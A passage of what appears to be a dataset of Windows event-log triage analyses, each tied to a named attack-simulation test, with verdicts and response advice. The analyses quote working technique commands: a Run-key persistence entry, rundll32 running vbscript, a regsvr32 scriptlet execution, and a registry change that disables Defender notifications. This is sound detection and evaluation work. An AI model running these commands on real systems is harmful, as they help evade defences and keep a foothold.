   - There is a high frequency of processes related to `MicrosoftEdgeUpdate.exe` within a short timeframe. While this might be part of legitimate update installations, the repetition and the spawning from executable files stored temporarily (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUEA85.tmp`) are indicators that warrant further inspection.

### Assessment:

Given the combination of activities, especially the execution of `Backstab64.exe` via PowerShell, along with frequent log-related commands and potentially malicious behavior patterns, there's a significant risk of malicious activity. The PowerShell activity especially is highly suspicious given its location and execution context within a temporary directory, which is characteristic of malware behavior attempting to evade detection.

### Resolution: MALICIOUS

### Guidance:

1. **Immediate Quarantine:**
   - Quarantine the affected host (Server002) from the network to prevent further potential malicious activity and lateral movement.

2. **Full Malware Scan:**
   - Conduct a detailed malware scan using an updated endpoint security solution to identify and remove any malware, specifically targeting the identified `Backstab64.exe`.

3. **Forensic Analysis:**
   - Investigate the precise origin and obtain detailed characteristics of `Backstab64.exe` and other recently executed files, possibly using digital forensic tools. This will help in determining the nature of the threat.

4. **Review Logs:**
   - Review the detailed logs from `wsmprovhost.exe`, as it appears to have been the parent process for suspicious executions. 

5. **User Activity Monitoring:**
   - Review recent activities by the user `SERVER002\\admin_test`, scrutinize any initiation of unusual commands, and validate the legitimacy of said user accessing the system.

6. **Patch and Update:**
   - Ensure that all systems, especially the one involving Microsoft Edge Update, are fully patched and updated to mitigate vulnerabilities that may have been abused.

7. **Review Security Policies:**
   - Assess and, if necessary, tighten security controls around PowerShell usage, script execution, and administrative access on endpoints.

This suspicious activity, coupled with typical evasion techniques and high integrity processes execution, supports the conclusion of potentially malicious activity on the system. Immediate response and investigative actions would be prudent."
Execution of non-dll using rundll32.exe,"Based on a thorough review and analysis of the provided Windows event logs, we have identified the following key points that may indicate suspicious activity:

1. **PowerShell Activity**: There is an entry in the Windows PowerShell log indicating that `rundll32.exe` was executed with a PNG file (`calc.png`) in the user's Downloads directory. This operation typically attempts to execute a DLL file, but associating it with a `.png` suggests obfuscation or malicious intent to mislead. The command used is `powershell.exe & {rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW}`. This is indeed suspicious as it is executed in a manner that could be indicative of an attempt to execute a hidden payload within a seemingly harmless image file.

2. **Sysmon Log Entries**: The Sysmon logs show the corresponding execution of `rundll32.exe` by `powershell.exe` confirming the same activity, reinforcing the suspicious nature of the action due to the unusual use of a PNG file in an attempt to execute code.

3. **Logon Events**: The security log shows a `4624` logon event for the `SYSTEM` user with a logon type of `5`, which indicates a service startup. Accompanying this, an event `4672` shows special privileges assigned to `SYSTEM`. This alone isn't usually suspicious but when seen alongside the other noted activities, it may contribute to potential malicious behavior if triggered by unauthorized service actions.

4. **Edge Update Activities**: The application and Sysmon logs show routine update processes for Microsoft Edge, which appear to be normal scheduled activities with no immediate signs of compromise or unusual behavior.

Given the circumstances, the execution of PowerShell and `rundll32.exe` with an unconventional command potentially aiming to obfuscate malicious activity is the most concerning and suspicious part of these logs. The peculiar mechanism involving a `.png` file to sidestep detection is a known technique for executing malicious payloads stealthily.

### Assessment and Resolution:
- **Resolution**: **SUSPICIOUS** - The logs indicate activities that warrant further investigation — particularly the PowerShell commands that use a PNG file with `rundll32.exe`. While it is not definitively malicious based on the information provided, it is anomalous and should be examined closely.
  
### Recommendations:
1. **Immediate Investigation**: Investigate the file `calc.png` in the user's Downloads directory for malicious content. It is crucial to identify if it contains executable code disguised within or attempts to invoke malicious activities.
   
2. **Review User Activity Logs**: Identify any unusual behavior or access patterns for the user associated with these PowerShell activities to check for potential compromises or misuse.
   
3. **Run Antivirus/Antimalware Scans**: Execute comprehensive security scans focused on identifying and neutralizing potential threats triggered by the suspicious PowerShell activity.
   
4. **Monitor and Audit**: Enhance monitoring to detect further abnormal command execution or inconsistent behavior on the system in question.
   
5. **Security Awareness**: Reinforce security training to ensure users do not execute unfamiliar files or scripts that could pose security threats.

Additional steps may be needed based on the outcomes of the immediate follow-up actions. Always ensure that you have regular updates and patches applied to software to mitigate vulnerabilities that could be exploited by such attempts."
Activate Windows NoDesktop Group Policy Feature,"Based on the event logs provided, here is a detailed analysis:

### **Application Log:**
1. **Windows Defender Status**: The log entry indicates that Windows Defender is in an 'ON' state which is an expected behavior and indicates that basic security is active on the system.
2. **Edge Update Service Stopped**: The log entries record the Edge update service being stopped twice within a short span. This could be a routine update or maintenance activity.

### **System Log:**
1. **Windows Update**: Security intelligence update for Microsoft Defender Antivirus was applied, which is a routine and expected activity to keep the antivirus definitions up to date.
2. **Kernel-General (Time Change)**: The system time is being updated twice in quick succession. This usually coincides with time synchronization activities from a network time protocol (NTP) source, which in this case is `time.windows.com`.

### **Sysmon Log:**
1. **Execution of Wevtutil and Conhost**: Multiple instances of 'wevtutil.exe' and 'conhost.exe' were executed by `SERVER002\admin_test`. While these processes are native utilities, frequent execution in a short time span, especially by an admin account, is worth further examination.
2. **Registry Modification**: There is a command execution that modifies registry settings (`cmd.exe` executed with a command to add the `NoDesktop` value under `Explorer` policies). This modification can be used to alter user interface settings, potentially to hinder visibility of desktop icons, which can be used by malware to limit user interaction.
3. **Edge Update Activities**: Multiple instances of Microsoft Edge Update processes executed, with multiple command-line arguments seen that are generally expected for update activities. The use of `NT AUTHORITY\SYSTEM` account also indicates that these are legitimate background update tasks by design.

### **Security Log:**
1. **Time Change Event**: The security log entries once again reflect system time changes, corroborated by the system log.

### **Assessment:**
- **Edge Updates**: The bulk of the logs relating to Edge updates suggest routine software updates. While there's frequent execution, there's nothing evidently malicious given the context of the processes and accounts involved.
- **Wevtutil and Conhost Execution**: While native, the frequent execution by an admin account ('admin_test') in quick succession is notable. This is often a pattern observed in automated scripts or misuses.
- **Registry Change**: The registry change involving `NoDesktop` under `Explorer` is a critical point to highlight. Changing user experience settings in the registry in such a manner can be indicative of potential malicious behavior, especially if not sanctioned by policy or IT processes.
  
### **Conclusion:**
**Resolution: SUSPICIOUS**

While much of the activity can be seen as potentially benign (like routine updates), the specific registry change and the frequency of execution for certain processes require further investigation to rule out misuse or malicious intent. It's advisable to:
- Confirm if the registry change was authorized and evaluate its sources.
- Review any related user actions or associated scripts with the 'admin_test' user.
- Monitor for any further anomalistic activity in real-time, especially involving process executions and system modifications."
Windows Modify Show Compress Color And Info Tip Registry,"After reviewing the provided Windows event logs, the following points were observed:

1. **Service Stoppages**:
   - There are multiple instances of the ""edgeupdate"" service stopping, as seen in the Application log (EventRecordID 2385 and 2386). Service stoppages can sometimes be benign, part of regular system operations, or scheduled updates.

2. **System Processes**:
   - The logs show frequent invocation of system processes such as `wevtutil.exe` (Windows Event Utility) and `conhost.exe` (Console Window Host) by the user `SERVER002\admin_test`. While typical in some administrative tasks, repeated calls in a short period might merit further investigation to ensure they align with administrative duties and are not attempts at log manipulation or console commands.

3. **Process Execution**:
   - The `hostname.exe` and `whoami.exe` commands executed by `SERVER002\admin_test` are typically benign, often used for system information gathering. However, the execution closely following `wevtutil.exe` and `conhost.exe` calls might be part of a script or batch operation.
   - Execution of `cmd.exe` with registry modification commands via `reg.exe` to alter user settings (`ShowInfoTip` and `ShowCompColor`) could indicate script execution to modify system appearance or behavior, potentially indicative of a post-compromise activity or policy enforcement.

4. **Microsoft Edge Update Process**:
   - Numerous events related to `MicrosoftEdgeUpdate.exe` are seen, consistent with update activities (`/svc`, `/update`, `/regsvc`, `/regserver` flags among others), executed by `NT AUTHORITY\SYSTEM`. This process trail suggests ongoing update tasks, common for application maintenance, particularly with Edge being a routinely updated browser. Logs show these processes executing as part of scheduled tasks that the Edge Update service typically handles.

5. **Registry Modifications**:
   - The script execution for registry changes warrants attention to ensure these scripts are authorized changes and not indicative of unauthorized persistence methods or attempt at subverting user interface settings stealthily.

Upon assessment, no explicit malicious activity, such as typical indicators of compromise (backdoor executions, privilege escalations, suspicious external communications), was detected in the logs. However, the behavior observed is categorized as **SUSPICIOUS** due to:

- Frequent, rapid execution of administrative tools.
- Scripts modifying user registry settings without clear context.

**Resolution**:
- **SUSPICIOUS**: Logs contain activity that doesn't look right and warrants further investigation.

**Guidance**:
- Conduct interviews with the user `SERVER002\admin_test` to verify if actions taken were legitimate administrative tasks.
- Review organization policies on script or batch deployment to ensure compliance.
- Monitor subsequent logs for any correlation with unauthorized access or system anomalies.
- Assess network traffic from `Server002` for any unauthorized connections or data exfiltrations."
Modify Registry of Local Machine - cmd,"### Detailed Analysis of the Logs:

#### Sysmon Logs:
1. **Process Execution Anomalies**:
   - There are multiple events involving the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. These processes are commonly used for handling Windows event logs and console windows, respectively. Continuous invocation of `wevtutil.exe` can be suspected of possible clearing or tampering with event logs, especially when performed by a non-standard system account.

2. **Suspicious Command Line Activities**:
   - The Sysmon event with EventID 1 shows a `cmd.exe` process executing the command: 
     ```
     reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
     ```
     This command registers `calc.exe` to run on startup. Such registry modifications can indicate a persistence mechanism often used by malicious actors to execute payloads.

3. **Use of Administrative Privileges**:
   - The processes are consistently executed with high integrity levels under the `admin_test` account, which indicates elevated permissions. This suggests either a privileged user's action or potential misuse of administrative credentials.

#### System Logs:
- The logs indicate routine time adjustments with no significant anomalies that relate directly to potential security threats.

#### Application Logs:
- Both events relate to services stopping, particularly concerning 'edgeupdate'. If intended, such actions can disrupt updates, potentially to maintain persistence for an unauthorized application.

#### Security Logs:
- There are kernel time-change events reflecting slight time adjustments. These adjustments are typically benign unless seen in the context of evading time-based security controls or logging mechanisms.

#### Indicators of Compromise:
- **Process Execution**: Unusual frequent creation of processes such as `wevtutil.exe` could point to log tampering.
- **Registry Modification on Autostart**: The registry key modification to launch `calc.exe` is unexpected and suggests a method to ensure an executable runs on system startup, indicative of potential malicious intent.

### Assessment:
Considering the identified suspicious activities, such as the execution of unusual commands manipulating startup entries and frequent log manipulation tools, there are strong indicators suggestive of potentially malicious activities. The intended persistence through registry modifications and repeated administrative processes signal unauthorized activities.

### Conclusion:
**Resolution: SUSPICIOUS**

While there are clear indicators suggesting unauthorized or potentially malicious actions such as persistence mechanisms and potential log tampering, a definitive conclusion of maliсious intent cannot be fully established without further investigation. It is essential to conduct a deeper forensic investigation, focusing on:
- Inspecting the intention behind the registry modifications.
- Examining network connections of these accounts and processes.
- Reviewing any additional security controls or logs outside these logs, especially focusing on files or network activity triggered by this host.

**Guidance**:
Immediate containment and review of the `admin_test` account for unauthorized access or modifications are recommended. Consider isolating the affected host for detailed examination and ensure no continuity of suspicious activities across other parts of the network."
Indirect Command Execution - pcalua.exe,"Upon review of the provided logs from the Windows host, I have analyzed the System, Sysmon, Application logs, along with others, to detect any suspicious or malicious activity. Here is a detailed assessment:

**Analysis of the Logs:**

1. **System Log:**
   - The log mentions a time-service update from time.windows.com, which is a normal behavior for synchronizing system time with NTP servers. No suspicious activity noted here.

2. **Sysmon Log:**
   - Multiple instances of standard Windows binaries such as `hostname.exe`, `whoami.exe`, `cmd.exe`, `calc.exe`, and `wevtutil.exe` were executed by the user `SERVER002\admin_test`. Each execution observed doesn't inherently appear malicious as they are native system binaries.
   - The execution of `hostname.exe`, `whoami.exe`, and `conhost.exe` usually indicates a check of the system name or logged-on users, which could be normal administrative activities.

   - **Notable Entries:**
     - A `cmd.exe` process initiated various executions (including `calc.exe`) which might indicate normal user activity trying to open the calculator. The command used (`pcalua.exe -a calc.exe`) is associated with the Program Compatibility Assistant, indicating possibly an issue with compatibility, leading to this being executed via command prompt.
     - Usage of `wevtutil.exe`, which is used for managing event logs and subscriptions, although not necessarily indicative of malicious behavior, without more context, raises some interest. If not a part of standard operations or batch tasks run by `admin_test`, this would need further investigation to verify it was legitimate administration activity.
     - The execution of multiple `pcalua.exe` commands from `cmd.exe` suggests an attempt to deal with compatibility settings—this could be normal depending on the context.

3. **Application Log:**
   - Contains logs related to the Software Protection Platform Service, which is responsible for the activation and licensing of Windows. No suspicious activity noted here.

**Assessment:**

- **No definitive malicious activity detected:** The activities logged in Sysmon typically represent usage of legitimate Windows utilities. Executions by the user `SERVER002\admin_test` involve common tasks that could either be administrative maintenance or benign user actions.

- **SUSPICIOUS: Further investigation required:**
  - Although nothing explicitly malicious was identified, due to the use of `cmd.exe` scripts to launch applications and potential compatibility configurations, it is advisable to verify the context of these activities with the user or administrator responsible (if possible) to rule out potential misuse.
  - Investigate the purpose of `wevtutil.exe` executions and correlate with any legitimate administrative tasks.

**Resolution:**
Without concrete evidence of compromise, the activities recorded in these logs can be classified as **SUSPICIOUS**, and it is advisable to conduct a deeper investigation by correlating these events with any deviation from expected behavior or policies for the user `admin_test`."
Disable Win Defender Notification,"Upon reviewing the provided Windows event logs from different sources (System, Sysmon, Application, and Security logs), the analysis identifies the potential for unusual activities:

1. **System and Security Logs**:
   - Multiple entries indicate time changes in the system, specifically from ""2024-10-24 17:10:02.6745465"" to ""2024-10-24 17:10:00.6468746"". This could be a sign of time manipulation, although no clear explanation or additional suspicious behavior follows this change.
   - The time changes were made by the `svchost.exe` process under `NT AUTHORITY\LOCAL SERVICE`. Adjustments like these can sometimes indicate an attempt to hide tracks or synchronize events within a specific timeframe, but by themselves do not confirm suspicious activity without supporting evidence.

2. **Sysmon Logs**:
   - The logs document legitimate and expected operations from processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`, and Microsoft Edge updates. Most processes running under the `SERVER002\admin_test` seem benign, such as `hostname.exe` and `whoami.exe`, typically standard queries.
   - However, a `cmd.exe` process executed to modify Registry settings using the command: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f`. This behavior could be suspicious, indicating an effort to disable security notifications which is considered a potential threat vector.

3. **Application Log**:
   - Logs mainly show that services related to Edge updates are stopped, which could correspond to regular update workflows or restarts of services from Microsoft Edge updating processes.

**Findings and Assessment**:
- The manipulation of time and Registry changes, in particular, the disabling of security notifications, raises a red flag.
- The presence of administrative activities and `cmd` registry modifications hints at potential suspicious behavior.
- However, authenticating users initiate these processes leading to a resolution inclined towards standard operations, unless corroborated by the system's owner as unauthorized.

**Resolution**:
- **SUSPICIOUS** - The actions observed, particularly the registry changes, suggest potentially risky behavior but are not conclusively malicious. Further investigation into the user `SERVER002\admin_test` actions and the justification for these changes is warranted. This would include verifying with system administrators whether such changes were expected or system/app updates caused these changes. Additional monitoring and proactive defenses, such as safeguarding the Registry with tighter control policies, are advised.

**Guidance**:
- Communicate with the user or system owner to confirm legitimacy and permissibility of these registry changes.
- Ensure logging, alerts, and monitoring for any further unexpected registry changes or time manipulation. 
- Consider reviewing access logs and admin activities for anomalies or similar patterns in other systems."
Javascript in registry,"Upon analyzing the provided logs, several suspicious elements and behaviors suggest potential malicious activity:

### PowerShell Logs

- **Registry Modification**: The consistent invocation of PowerShell with the following command:  
  `powershell.exe & {New-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"" -Name data -Value ""<script>""}` indicates an attempt to introduce script tags into the Windows registry. This behavior can be a part of a script injection attack or a method to persist malicious scripts.
- **Command Execution**: The repetition of this command across different PowerShell providers indicates automated activity, possibly intended to avoid detection.

### Sysmon Logs

- **Wevtutil Usage**: Wevtutil.exe is frequently executed by SERVER002\admin_test, indicating potential log access or manipulation activity. This tool is typically used for managing event logs and accessing log details; however, its frequent use can suggest attempts to clear or tamper with event logs to hide activities.
- **Unattended Microsoft Edge Update**: Multiple entries related to Microsoft Edge Update at a high frequency, including various process images and command-line executions under `NT AUTHORITY\SYSTEM`, infer a potential misuse of legitimate processes for lateral movement or persistence.
- **Hostname and Whoami**: While the execution of `hostname.exe` and `whoami.exe` might not inherently be malicious, their execution in the context following suspicious PowerShell activity could suggest reconnaissance actions.

### Security Logs

- **NTLM Logins**: Multiple login events with elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`) associated with the account `admin_test` over NTLM protocol, might be a sign of leverage for administrative access, possibly reflecting attempts for privilege escalation or lateral movement within the system.

### Summary

#### Indicators of Compromise
- The attempt to modify registry settings using PowerShell with script values.
- Unusual usage patterns of `wevtutil.exe` by an administrator-level account which could indicate efforts to hide traces of malicious activity.
- Recurrent privileged logins using NTLM which could suggest compromised or misused credentials.

### Resolution

The evidence in the logs suggests indicators of malicious behavior. These activities, particularly the registry modification via PowerShell and excessive `wevtutil.exe` usage, coupled with unexplained high-privilege login actions, are commonly associated with cyber incidents.

Therefore, the analysis yields a conclusion of **MALICIOUS** activity. 

### Recommendations

1. **Immediate Isolation**: Isolate Server002 from the network to prevent further escalation.
2. **Credential Audit and Reset**: Conduct a thorough audit of all accounts, especially `admin_test`, and consider resetting passwords due to potential credential compromise.
3. **Forensic Investigation**: Engage in a deeper forensic investigation to analyze the full scope of the incident.
4. **Review and Harden Security Settings**: Implement stricter PowerShell execution policies, monitor registry edits more stringently, and enforce stronger security measures (e.g., 2FA) on NTLM usages.
5. **Log Analysis Continuation**: Further study related network logs and other adjacent machines for potential lateral movements or spread of malicious activities."
Rundll32 execute VBscript command using Ordinal number,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided logs, several noteworthy activities and anomalies are observed. Let us break down the key findings:

1. **Microsoft Edge Update Activities:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and its related components (such as `MicrosoftEdgeUpdateSetup_X86`, `MicrosoftEdgeUpdateComRegisterShell64`) are seen in the logs. This activity involves normal update processes for Microsoft Edge, which run under the `NT AUTHORITY\SYSTEM` account with high integrity levels. This is typically expected behavior for automatic software updates occurring on a system.
   - The command-line arguments for the Edge update processes include update and registration functions, which are aligned with standard update operations.

2. **Suspicious Script Execution:**
   - At `2024-10-26 16:04:24`, there is a suspicious execution command involving `cmd.exe` with a command line that leverages `rundll32.exe` to execute vbscript to launch `calc.exe`. The command is `""cmd.exe"" /c rundll32 vbscript:""\\..\\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)`.
   - This technique is often associated with malicious activities, such as malware or an unauthorized script execution attempt designed to evade basic defenses by using `rundll32` and script languages.

3. **Time Change Events:**
   - There are multiple time change events logged (Event ID 4616) pointing to a previous time of `2024-10-26 16:04:27` being set back to `2024-10-26 16:04:23`. This is indicative of system time being manually changed or corrected, which could potentially be used to tamper with timestamped log entries or correlate events.

4. **Administrative Privileges and Logins:**
   - User `admin_test` has multiple successful logins with elevated privileges and various logon sessions (Event ID 4624 and 4672) using the `NTLM` authentication package.
   - The involvement of the user `admin_test` alongside the execution of potentially dangerous processes indicates that further investigation into the actions performed during this session is warranted.

### Threat/Risk Assessment
- **Malicious Indicators:**
  - The execution of embedded scripts through `rundll32` to open Calculator is highly suspicious and indicative of `fileless malware` or similar attack scenarios.
  
- **Benign Indicators:**
  - Regular system and software update activities (e.g., Microsoft Edge updates) appear legitimate and are common practices expected within managed environments.

### Conclusion and Recommended Actions
Based on the analysis, it is recommended that the resolution be marked as **MALICIOUS** due to the detected execution of suspicious scripts, leveraging `rundll32` and `vbscript`, resembling common tactics in malware execution.

### Recommended Actions
1. **Immediate Containment:**
   - Isolate the host `Server002` from the network to prevent any potential spread of malicious activities.
   
2. **In-depth Investigation:**
   - Conduct a detailed forensic analysis of the suspicious execution of `rundll32` and `calc.exe` to determine its origin and context.
   - Review all login activities around the `admin_test` account, paying close attention to IP address access points and potential unauthorized activities.

3. **Strengthen Monitoring:**
   - Enhance logging and monitoring for unusual script execution attempts, privilege escalation, and suspicious authentication attempts across the network.

4. **Update Security Measures:**
   - Ensure that endpoint protection and intrusion detection systems are updated to better detect and respond to fileless attacks and suspicious script executions."
Invoke HTML Application - Jscript Engine Simulating Double Click,"### Analysis:

#### Sysmon Logs:
1. **PowerShell Execution**: The Sysmon logs record the execution of PowerShell with the command line `""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}`. This command is notably suspicious for several reasons:
   - The `Invoke-ATHHTMLApplication` command is not a standard PowerShell command, suggesting a possible custom script or malicious function invocation.
   - The use of HTA (HTML Application) files and JScript often appear in malicious activities like phishing attacks or fileless malware.

2. **Frequent `wevtutil` and `conhost` Executions**: Several `wevtutil.exe` and `conhost.exe` executions are logged:
   - `wevtutil.exe` is used to manage Windows Event Logs. While its presence alone is not necessarily suspicious, frequent usage could indicate attempts to clear or tamper with event logs.
   - `conhost.exe` is the console window host, tied to the console session. Multiple instances running close together in time may be unusual but are not definitive indicators of malicious activity.

3. **UsoClient and Hostname.exe**: 
   - `UsoClient.exe` is a legitimate Windows Update Orchestrator tool. The command executed is `""C:\Windows\System32\usoclient.exe"" StartStoreUpdates`, which supports update checking. The use is expected in routine update operations.
   - `Hostname.exe` is merely retrieving the hostname of the system, typically benign.

4. **Whoami.exe Execution**:
   - The execution of `whoami.exe` to display user information is frequently used in scripts to verify the current user's context. However, in close sequence with potential suspicious activities, it could be part of a script verifying account privileges.

#### Windows PowerShell Logs:
1. **PowerShell Script Execution**: Matches the Sysmon observation on PowerShell. The command line execution is repeated here further supporting the suspicion of unconventional script execution.

#### Application Logs:
1. **Software Protection Platform Event**: Logs related to the Software Protection Platform do not indicate any compromise but are part of routine operations for licensing and activation.

#### System Logs:
1. **Windows Update Activity**: The logs show multiple updates being checked and processed, consistent with routine software update actions by the Windows Update Agent.

### Conclusion:

**Suspicion Level: SUSPICIOUS**

- **Indicators:**
  - The PowerShell command involving `Invoke-ATHHTMLApplication` and HTA files.
  - Potentially excessive and closely-timed logging utilities (`wevtutil.exe` instances).

- **Immediate Action:**
  - **Further Investigation Required**: Investigate the origin and nature of the `Invoke-ATHHTMLApplication` PowerShell activity. Ensure it is known and understood or verify it against known threat indicators.
  - Review user's activity that prompted these log entries, especially concerning scheduled tasks and remote access configurations.
  - Capture and analyze network traffic if possible, focused on the timeframe of these suspicious executions.
  - Consider scanning the system for fileless threats and confirm event log integrity is maintained.

Activate Windows NoClose Group Policy Feature,"### Analysis of the Provided Windows Event Logs

The logs provided span various components such as Security, Application, Sysmon, and System logs. Here's a detailed breakdown of the logs and their implications:

#### Security Logs

- **Event ID 4616 (System Time Change):** 
  - The security logs show multiple entries for ""EventID 4616,"" indicating system time changes executed by the `svchost.exe` process under the `LOCAL SERVICE` account. This could be benign, as system time changes can be legitimate when performed by the Windows Time Service. However, frequent and unsanctioned time changes can also be a tactic for evading detection by timestamp manipulation.

#### Application Logs

- **Edgeupdate Service Stopped:**
  - An entry indicates the ""edgeupdate"" service stopped at a specific timestamp. Such stopping might be part of routine system or application maintenance. It's not inherently suspicious, but continuous stops without corresponding starts could warrant further investigation.

#### Sysmon Logs

- **Process Creation and Image Load Events (Event IDs 1 and 5):**
  - Several processes, such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe`, executed under the user `SERVER002\admin_test`.
  - Noteworthy is the execution of `cmd.exe` with a command to add a registry key (`reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f`). This command modifies Windows Explorer policies, potentially affecting user interface elements, which could be indicative of an attempt to modify system behavior surreptitiously.

- **Frequent Execution of Microsoft Edge Update Processes:**
  - Multiple entries show the execution and registrations of Microsoft Edge Update processes. This could indicate an ongoing update process. However, the presence of these processes' execution from temporary directories and with various command-line arguments should be evaluated to ensure they align with normal update operations.

#### System Logs

- **Kernel General and Time Service Events:**
  - The logs show events related to time services and time changes (Event IDs 1 and 24), consistent with those seen in the security logs. While legitimate services may perform these actions, anomalies in timing actions, especially if timed with suspicious activities, could indicate an attempt to cover tracks.

### Conclusion and Assessment

- **Potential Indicators of Malicious Activity:**
  - The use of `cmd.exe` to execute a registry modification command is suspicious. This kind of action could be utilized by malware to alter system settings, disable certain functionalities, or persist within the system.
  - The frequent execution of update processes for Microsoft Edge from unconventional directories may suggest a misuse of legitimate processes to perform unauthorized actions.

### Recommendations

- **Further Investigation Needed (Resolution: SUSPICIOUS):**
  - Investigate the context and source of the registry modification command to determine intent and origin.
  - Review the integrity and source of EdgeUpdate processes, especially those operating from temporary directories, to ensure they align with authentic update processes.
  - Continue monitoring the system time change logs for any unusual patterns or related suspicious activities that might denote evasion tactics.

Proceed with these follow-up actions and enhance logging to capture detailed command-line arguments and user activities to aid in potential threat actor identification."
Regsvr32 local COM scriptlet execution,"After analyzing the provided Windows event logs, I've identified certain events that can be indicative of suspicious or potentially malicious activity, particularly focusing on command executions and associated processes.

### Observations:

1. **PowerShell Execution**:
   - PowerShell was executed by the user `SERVER002\admin_test`. PowerShell can be leveraged for administrative tasks but can also be abused by attackers. However, without specific command-line arguments or more context on its usage, it's challenging to determine malicious intent solely based on its execution.

2. **Process Executions**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were initiated. `wevtutil.exe` is a utility used for managing event logs, and while its usage can be normal, frequent or unexpected activity may suggest log clearing or tampering efforts.

3. **Suspicious Command Line**:
   - The most concerning event involves the execution of `cmd.exe` with a command line that includes `regsvr32.exe /s /u /i:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\RegSvr32.sct"" scrobj.dll`. This command is suspicious for a few reasons:
     - `regsvr32.exe` is a legitimate Windows utility to register COM objects but can be exploited to execute scripts (.sct files) through a technique known as ""Regsvr32 /sct"" which bypasses application whitelisting solutions.
     - The use of `/s`, `/u`, and `/i` flags combined with the `scrobj.dll` suggests an attempt to execute code in a stealthy manner, which is a known Indicator of Compromise (IoC).

4. **Parent-Child Process Relationships**:
   - Several processes like `cmd.exe`, `conhost.exe`, and `regsvr32.exe` have `wsmprovhost.exe` as a parent process. `wsmprovhost.exe` is associated with Windows Remote Management, suggesting the commands might have been executed remotely, adding a layer of concern regarding unsupervised administrative activities.

5. **Network Services and System Processes**: 
   - Normal system maintenance tasks are observed further in the logs, such as Windows Servicing Stack (`TiWorker.exe`) and Trusted Installer activities, which seem routine and expected.

6. **Edge Update Activities**:
   - Multiple entries related to Microsoft Edge Update processes are logged; these appear routine given system updates.

### Assessment:
Given the context of the logs and in particular the command line execution involving `regsvr32` with the suspicious script file, the activity is **SUSPICIOUS**. The observed activities do not definitively demonstrate harmful actions but are questionable enough to warrant further investigation. The use of regsvr32 for script execution, especially from the temporary path, is often linked to malware deployment tactics.

### Recommendation:
1. **Further Investigation**:
   - Analyze any existing network activity logs or packets that coincide with the time frame. Look for any connections to unknown IP addresses or domains.
   - Check the integrity and origin of the suspicious script file at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\RegSvr32.sct`.
   - Ascertain the legitimacy of the `admin_test` user activities, possibly by engaging with the user if it's an internal account.

2. **Review Policies**:
   - Ensure that scripts and unplanned commands are logged, especially those executed by PowerShell or cmd.
   - Evaluate group policies to see if the use of utilities like `regsvr32` are being monitored or restricted as part of your organization's security policies. 

3. **Potential Containment**:
   - If further analysis confirms malicious intent, consider isolating the host from the network and conducting a thorough investigation to remove any potential backdoors or malware.

Final Resolution: **SUSPICIOUS** - The logs contain activity that doesn't look completely benign and needs more investigation."
Command Execution with NirCmd,"Upon reviewing the provided event logs from the Windows host, the following observations can be made:

1. **Review of Event IDs**:
   - Repeated `EventID: 4624` and `EventID: 4672` indicate successful logons and the assignment of special privileges. The `SYSTEM` account has logged in using `LogonType: 5` which is a service logon, typical for system processes. This is regular behavior for system operations.
   - There is a consistent association with high privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others. While these are powerful, they are normally held by the `SYSTEM` account.

2. **Credential Access and Retrieval**:
   - Several `EventID: 5379` entries reflect failed credential operations. The error code `3221226021` indicates a system error possibly related to account issues with `MicrosoftAccount:user=02txoixylodcstop`. Although these repeats suggest an attempt to access Microsoft Accounts/Live services, without success, it does not denote a clear threat without other malicious context.

3. **PowerShell Activity**:
   - The PowerShell logs indicate usage of the `nircmd.exe` utility through a series of PowerShell commands. The execution path is `""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\nircmd.exe""`, and it attempts to hide the system clock. While `nircmd.exe` is a legitimate utility, its usage can be associated with unauthorized operations or system modifications. However, without further malicious indicators, this alone doesn't confirm a breach but raises suspicion.

4. **Sysmon Process Activity**:
   - There are detailed logs of processes, including `nircmd.exe`, being executed by a user `SERVER002\admin_test`. The command line shows it hiding the tray clock using indirect execution via PowerShell and CMD. This behavior is unconventional for regular operations but is not necessarily malicious unless combined with other suspicious activities.
   - Processes related to `MicrosoftEdgeUpdate` are seen regularly. These updates and installers appear consistent with system maintenance activities, and while numerous, do not independently suggest maliciousness.

5. **Network and System Services**:
   - Various system services (e.g., `WmiPrvSE.exe`, `svchost.exe`) and system components such as `DeviceCensus.exe`, `CompatTelRunner.exe` are operating under `SYSTEM` privileges. These are typical for legitimate system health and telemetry operations.

**Assessment**:
There is no direct evidence of malicious activity such as unauthorized user logins, privilege escalations by unauthorized entities, or known malware signatures. However, the use of the `nircmd.exe` utility to manipulate the GUI environment without a clear business context introduces suspicions.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Investigate the reasons behind `nircmd.exe` usage, ensuring it's authorized by system administrators or IT staff.
- Confirm no unauthorized access to paths and utilities, and assess if they're approved in your environment.
- Monitor logs for further unusual behavior, focusing on `admin_test` user actions and further PowerShell executions.
- If possible, implement stricter application whitelisting to prevent unauthorized utility execution.

Further investigation is warranted to verify if these activities align with expected operations or require stricter authorization and monitoring measures."
DiskShadow Command Execution,"Upon analyzing the provided Windows event logs, several activities standout that warrant further scrutiny due to the potential indication of malicious behavior:

1. **Powershell and Wevtutil Usage**:
